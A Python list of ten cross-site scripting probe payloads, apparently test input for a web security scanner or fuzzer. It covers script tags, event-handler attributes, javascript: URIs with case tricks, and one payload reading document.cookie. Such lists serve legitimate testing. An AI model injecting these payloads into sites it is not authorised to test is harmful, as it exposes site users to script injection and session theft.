XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"<script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
    "'-alert(1)-'",
    "<body onload=alert(1)>",
    "jAvAsCrIpT:alert(1)",
    '"><script>alert(document.cookie)</script>',
    '<iframe src="javascript:alert(1)">',
]
